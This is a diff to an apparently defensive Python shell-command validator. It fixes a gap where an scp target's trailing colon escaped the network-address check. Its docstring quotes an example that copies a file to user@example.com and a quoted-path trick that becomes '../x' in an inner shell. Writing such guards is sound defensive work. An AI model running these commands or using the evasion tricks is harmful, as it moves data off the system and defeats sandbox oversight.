@@ -1396,6 +1396,7 @@ def _judge_word(
     word: str,
     argument: str,
     continues: bool,
+    trailing_colon: bool,
     root: str,
     dialect: str,
     trusted: bool,
@@ -1414,6 +1415,8 @@ def _judge_word(
         return _refuse(word, _UNCHECKED)
     if _SCP_ADDRESS_RE.match(word) or _HOST_PORT_RE.match(word):  # D5: a schemeless network address
         return _refuse(word, _NETWORK)
+    if trailing_colon and _SCP_ADDRESS_RE.match(word + ":"):  # D5, R5: the colon `_words` trimmed
+        return _refuse(word + ":", _NETWORK)
     has_separator = any(separator in word for separator in _SEPARATORS)
     if has_separator and _expands(word):  # 3: where it points is decided when the shell runs
         return _refuse(word, _UNCHECKED)
@@ -1831,21 +1834,26 @@ def _lex(command: str, bash: bool, reading: str) -> Tuple[List[str], List[str]]:
     return arguments, nested
 
 
-def _words(arguments: List[str]) -> List[Tuple[str, str, bool]]:
-    """Each argument's words, as (word, its argument, whether the argument carries on past it).
+def _words(arguments: List[str]) -> List[Tuple[str, str, bool, bool]]:
+    """Each argument's words, as (word, its argument, whether the argument carries on past it,
+    whether a `:` was trimmed directly after the word).
 
     Split only at what stays in the string -- the whitespace, `=` and `,` that survived lexing --
     and trimmed of delimiters at both ends. A quote in the middle of a word is not split there:
-    `sh -c "echo > '.'./x"` hands its inner shell `'.'./x`, which that shell joins into `../x`.
+    `sh -c "echo > '.'./x"` hands its inner shell `'.'./x`, which that shell joins into `../x`. The
+    trailing-colon flag (D5, R5) lets `scp n user@example.com:` be matched with its colon restored,
+    since `_WORD_TRIM` removes it before the word ever reaches a judge.
     """
-    words: List[Tuple[str, str, bool]] = []
+    words: List[Tuple[str, str, bool, bool]] = []
     for argument in arguments:
         pieces = _WORD_SPLIT_RE.split(argument)
         for position, piece in enumerate(pieces):
-            word = piece.strip(_WORD_TRIM)
+            left_trimmed = piece.lstrip(_WORD_TRIM)
+            word = left_trimmed.rstrip(_WORD_TRIM)
             if word:
                 continues = position < len(pieces) - 1 or piece.rstrip(_WORD_TRIM) != piece
-                words.append((word, argument, continues))
+                trailing_colon = left_trimmed[len(word) : len(word) + 1] == ":"
+                words.append((word, argument, continues, trailing_colon))
     return words
 
 
@@ -1888,12 +1896,14 @@ def _read_command(
                 expanded_arguments.append(argument)
         arguments = expanded_arguments
     words = _words(arguments)
-    references = sum(1 for word, _, _ in words if _HUB_REFERENCE_RE[dialect].match(word))
+    references = sum(1 for word, _, _, _ in words if _HUB_REFERENCE_RE[dialect].match(word))
     # A reference is trusted only when the command names `HUB_URL` nowhere else. That refuses
     # every way of reassigning it first (`HUB_URL=`, `export`, `$env:HUB_URL =`) without a list.
     trusted = 0 < references == len(re.findall(r"(?i)HUB_URL", command))
-    for word, argument, continues in words:
-        refusal = _judge_word(word, argument, continues, root, dialect, trusted, hub_url)
+    for word, argument, continues, trailing_colon in words:
+        refusal = _judge_word(
+            word, argument, continues, trailing_colon, root, dialect, trusted, hub_url
+        )
         if refusal:
             return refusal
     # D1, R2: a brace an inner shell will expand is judged as expanded too -- the blanket worst
@@ -1908,8 +1918,10 @@ def _read_command(
         inner_alternatives = _expand_braces(marked, _BRACE_ARGUMENT_BUDGET)
         if inner_alternatives is None:
             return _refuse(argument, _TOO_MANY)
-        for word, inner_argument, continues in _words(inner_alternatives):
-            refusal = _judge_word(word, inner_argument, continues, root, dialect, trusted, hub_url)
+        for word, inner_argument, continues, trailing_colon in _words(inner_alternatives):
+            refusal = _judge_word(
+                word, inner_argument, continues, trailing_colon, root, dialect, trusted, hub_url
+            )
             if refusal:
                 return refusal
     for inner in nested:
@@ -2253,7 +2265,7 @@ def _names_a_runtime_value(command: str, dialect: str, reading: str) -> bool:
     """Whether any word of `command`, or a substitution nested in it, holds something the shell
     decides when it runs -- which the judge above cannot see."""
     arguments, nested = _lex(command, dialect == "bash", reading)
-    return bool(nested) or any(_expands(word) for word, _, _ in _words(arguments))
+    return bool(nested) or any(_expands(word) for word, _, _, _ in _words(arguments))
 
 
 def _report_decision(tool_name: str, decision: Dict[str, Any], tool_use_id: str) -> None:
